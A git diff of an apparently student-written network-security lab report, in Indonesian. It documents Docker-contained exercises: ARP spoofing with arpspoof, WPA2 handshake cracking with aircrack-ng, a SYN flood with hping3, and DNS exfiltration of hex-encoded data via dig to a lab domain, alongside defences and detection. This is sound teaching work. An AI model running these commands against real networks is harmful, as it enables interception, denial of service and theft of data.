@@ -204,3 +204,124 @@ Penjelasan :
   - Kesamaan nilai hash SHA-256 antara laporan-k9.txt dan hasil-k9.txt membuktikan proses enkripsi-dekripsi berjalan tanpa merusak integritas isi file.
   - Perintah kedua membangkitkan kunci privat RSA 2048-bit (key-k9.pem) dan sertifikat self-signed X.509 (cert-k9.pem) selama 30 hari untuk CN=k9.uts.local, sehingga nilai subject dan issuer sama karena sertifikat ditandatangani sendiri.
 
+# Tugas 3 (Pertemuan 3): ARP Spoofing
+```
+  docker network create lab-arp-k9
+  docker run -d --name korban-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
+  docker run -d --name gateway-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
+  docker run -d --name penyerang-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
+  docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{"\n"}}{{end}}' korban-k9 gateway-k9
+  
+  IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9)
+  IP_GATEWAY=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' gateway-k9)
+  MAC_GATEWAY=$(docker exec gateway-k9 cat /sys/class/net/eth0/address)
+  MAC_PENYERANG=$(docker exec penyerang-k9 cat /sys/class/net/eth0/address)
+  
+  docker exec korban-k9 python3 -c "import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b'init', ('$IP_GATEWAY', 9999))"
+  sleep 1
+  docker exec korban-k9 cat /proc/net/arp
+  
+  docker exec -d penyerang-k9 timeout 20 arpspoof -i eth0 -t "$IP_KORBAN" "$IP_GATEWAY"
+  sleep 4
+  docker exec korban-k9 cat /proc/net/arp
+  
+  docker exec korban-k9 python3 -c '
+  import socket, struct, sys
+  ip_gw, mac_gw = sys.argv[1], sys.argv[2]
+  ifidx = int(open("/sys/class/net/eth0/ifindex").read().strip())
+  s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, socket.NETLINK_ROUTE)
+  s.bind((0, 0))
+  ndmsg = struct.pack("=BBHiHBB", socket.AF_INET, 0, 0, ifidx, 0x80, 0, 1)
+  rta_dst = struct.pack("=HH4s", 8, 1, socket.inet_aton(ip_gw))
+  rta_ll  = struct.pack("=HH6s2x", 10, 2, bytes.fromhex(mac_gw.replace(":", "")))
+  payload = ndmsg + rta_dst + rta_ll
+  nlhdr = struct.pack("=IHHII", 16 + len(payload), 28, 0x105, 1, 0)
+  s.send(nlhdr + payload)
+  ' "$IP_GATEWAY" "$MAC_GATEWAY"
+  
+  docker exec korban-k9 cat /proc/net/arp
+```
+Hasil Praktikum 
+<img width="2872" height="626" alt="TUGAS 3 1" src="https://github.com/user-attachments/assets/78389c81-a6d3-429a-929d-dcdeb4f202c2" />
+<img width="2880" height="826" alt="3 2" src="https://github.com/user-attachments/assets/9542df19-5c97-432a-a240-6db4ff7be88a" />
+<img width="2880" height="946" alt="3 3" src="https://github.com/user-attachments/assets/8398050f-80e3-4edc-9692-3e47e410baec" />
+Penjelasan :
+  - Jaringan lab-arp-k9 dibuat dan tiga container (korban-k9, gateway-k9, penyerang-k9) dijalankan dengan kapabilitas NET_ADMIN agar diizinkan memanipulasi antarmuka dan tabel jaringan.
+  - Karena utilitas arp dan ip tidak tersedia di dalam container, pengecekan tabel ARP dilakukan melalui /proc/net/arp dan pengiriman paket UDP awal memicu pengisian cache ARP.
+  - arpspoof -i eth0 -t "$IP_KORBAN" "$IP_GATEWAY" dijalankan selama 20 detik untuk melakukan ARP poisoning di jaringan lokal.
+  - Skrip Python menggunakan socket AF_NETLINK (NETLINK_ROUTE) digunakan untuk memasang entri ARP permanen (flag 0x6) pada korban-k9 sehingga pemetaan IP-ke-MAC yang sah tidak mudah ditimpa oleh balasan ARP palsu.   
+
+# Tugas 4 (Pertemuan 4): Analisis Handshake WPA2
+```
+  curl -O [https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/test/capture_wds-01.cap](https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/test/capture_wds-01.cap)
+  curl -O [https://raw.githubusercontent.com/yastiaisyah/Network-Security-Course-Bank/main/UTS-Network-Security/01-sumber-lab/samples/wordlist-k9.txt](https://raw.githubusercontent.com/yastiaisyah/Network-Security-Course-Bank/main/UTS-Network-Security/01-sumber-lab/samples/wordlist-k9.txt)
+  docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w /work/wordlist-k9.txt /work/capture_wds-01.cap
+  docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w /work/wordlist-k9.txt -b 00:11:22:00:00:00 /work/capture_wds-01.cap
+```
+Hasil Praktikum
+<img width="1919" height="1079" alt="TUGAS 4 1" src="https://github.com/user-attachments/assets/118cc47f-9020-4ebc-a7f1-4e461e307857" />
+<img width="1919" height="608" alt="TUGAS 4 2" src="https://github.com/user-attachments/assets/1b116f76-e8e4-43cb-85ce-ab21d03daa8f" />
+Penjelasan :
+  - Berkas sampel capture (capture_wds-01.cap) dan wordlist (wordlist-k9.txt) diunduh ke direktori kerja lalu diproses menggunakan aircrack-ng di dalam kontainer uts-kali-tools.
+  - Penambahan parameter -b 00:11:22:00:00:00 mengarahkan pengujian langsung ke BSSID target test1 sehingga proses pengujian wordlist berjalan non-interaktif hingga selesai dan menampilkan status KEY NOT FOUND.
+
+## Empat Langkah Handshake WPA2 (4-Way Handshake)
+  - Pesan 1 (AP ke Client): Access Point (AP) mengirimkan ANonce (bilangan acak dari AP) kepada Client. Client kemudian menggabungkan ANonce dengan SNonce (yang dibuat Client), Pairwise Master Key (PMK), serta alamat MAC AP dan Client untuk menurunkan Pairwise Transient Key (PTK).
+  - Pesan 2 (Client ke AP): Client mengirimkan SNonce dan Message Integrity Code (MIC) yang dihitung menggunakan kunci KCK (bagian dari PTK) ke AP untuk membuktikan kepemilikan PMK dan mengonfirmasi kesiapan kunci.
+  - Pesan 3 (AP ke Client): AP memverifikasi MIC dari Client, lalu mengirimkan Group Temporal Key (GTK) terenkripsi beserta MIC baru untuk mengonfirmasi pemasangan kunci sesi.
+  - Pesan 4 (Client ke AP): Client mengirimkan paket konfirmasi terakhir (ACK) kepada AP untuk menandakan bahwa PTK dan GTK telah terpasang dan komunikasi data terenkripsi siap digunakan.
+
+# Tugas 5 (Pertemuan 5): ICMP dengan Scapy
+```
+  docker run --rm --network lab-arp-k9 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.22.0.2
+```
+Hasil Praktikum 
+<img width="2880" height="200" alt="TUGAS 5" src="https://github.com/user-attachments/assets/7c5ffab3-1943-4016-b5d7-f59a887495d6" />
+Penjelasan :
+  - Perintah menjalankan skrip Python kirim_icmp.py menggunakan Scapy di dalam kontainer uts-kali-tools yang terhubung ke jaringan lab-arp-k9, dengan direktori kasus/k5-scapy di-mount ke /work.
+  - Paket ICMP Echo Request dikirim dari IP 172.22.0.5 menuju target 172.22.0.2 dan menerima balasan berupa Tipe ICMP 0 (Echo Reply) dengan TTL 64
+
+## Penjelasan Smurf Attack
+  - Pengertian: Smurf Attack adalah jenis serangan Distributed Denial of Service (DDoS) berbasis protokol ICMP yang memanfaatkan jaringan perantara sebagai penguat (amplifier) untuk membanjiri target dengan trafik balasan.
+
+  - Cara Kerja: Penyerang mengirimkan paket ICMP Echo Request ke alamat broadcast suatu jaringan perantara dengan memalsukan (spoofing) alamat IP sumber menjadi alamat IP korban. Seluruh host aktif di jaringan perantara yang menerima broadcast tersebut akan membalas dengan ICMP Echo Reply langsung ke IP korban, sehingga membebani bandwidth dan sumber daya sistem korban.   
+image_7c320c.png
+
+# Tugas 6 (Pertemuan 6): SYN Flood dan Three-Way Handshake
+```
+  docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml up -d
+  docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
+  docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
+  docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
+  docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
+  docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml down -v
+```
+Hasil Praktikum
+<img width="2880" height="1242" alt="TUGAS 6" src="https://github.com/user-attachments/assets/4d790888-4d55-4ad4-98e5-26c52d36b273" />
+Penjelasan :
+  - Lingkungan k9_lab dijalankan dengan layanan k9-target-1 dan k9-attacker-1 menggunakan Docker Compose.
+  - Sebelum serangan hping3 dijalankan, jumlah koneksi pada status SYN_RECV di target adalah 0, lalu meningkat menjadi 1 saat serangan banjir paket SYN berlangsung.
+  - Capture tcpdump pada port 80 (172.23.0.2:80) menangkap alur TCP three-way handshake antara klien 172.23.0.3:53412 dan server target: diawali paket SYN (Flags [S]), dibalas SYN-ACK (Flags [S.]), lalu dilengkapi ACK (Flags [.]) sebelum pertukaran data HTTP (GET / HTTP/1.1 dan 200 OK) serta penutupan koneksi (FIN).
+
+# Tugas 7 (Pertemuan 7): DNS Exfiltration
+```
+  docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml up -d
+  echo -n '24552011306' | xxd -p
+  docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131333036.k9.exfil.lab @dns
+  docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k9.log
+  python3 kasus/k9-dns-detect/analisis_dns.py dns-k9.log
+  echo '3234353532303131333036' | xxd -r -p
+  docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml down -v 
+```
+Hasil Praktikum
+<img width="2880" height="814" alt="TUGAS 7" src="https://github.com/user-attachments/assets/abe781f4-1d8b-4db5-9817-93d4eb94c1de" />
+Penjelasan :
+  - Perintah echo -n '24552011306' | xxd -p mengubah NIM menjadi representasi heksadesimal 3234353532303131333036 yang disisipkan sebagai subdomain pada kueri dig ke k9.exfil.lab melalui server @dns.
+  - Log dari layanan dns disimpan ke dns-k9.log dan dianalisis menggunakan analisis_dns.py, yang mengidentifikasi pola label subdomain heksadesimal panjang sebagai aktivitas eksfiltrasi data mencurigakan.
+  - Perintah echo '3234353532303131333036' | xxd -r -p mengembalikan string hex ke bentuk teks aslinya (24552011306), sebelum akhirnya lingkungan lab dibersihkan dengan docker compose ... down -v.
+
+## KESIMPULAN
+  Seluruh rangkaian praktikum dan pengujian UTS Network Security (mulai dari dasar kontainerisasi Docker, volume persisten, jaringan bridge terisolasi, kriptografi simetris AES-256 dan asimetris RSA/sertifikat X.509, hingga analisis serangan dan pertahanan jaringan seperti ARP spoofing, analisis handshake WPA2, ICMP dengan Scapy, SYN flood, dan DNS exfiltration) telah berhasil dijalankan dan didokumentasikan dengan baik.   
+  - Infrastruktur & Isolasi Jaringan: Penggunaan volume Docker menjaga persistensi data meskipun kontainer dihapus, sementara jaringan kustom dan internal network pada Docker Compose membatasi eksposur layanan ke luar sekaligus tetap memungkinkan komunikasi internal antar-layanan.
+  - Kriptografi & Integritas Data: Fungsi hash (MD5/SHA-256) dan tanda tangan digital RSA sensitif terhadap perubahan data sekecil apa pun, sedangkan enkripsi AES-256 serta sertifikat X.509 mendukung kerahasiaan dan autentikasi identitas.
+  - Serangan, Deteksi, & Mitigasi: Pengujian ARP spoofing, SYN flood, WPA2 handshake, dan DNS exfiltration menunjukkan bagaimana celah protokol lapisan data, transport, dan aplikasi dapat dimanfaatkan, sekaligus menegaskan pentingnya mitigasi seperti entri ARP statis/permanen, SYN cookies, serta pemantauan anomali trafik
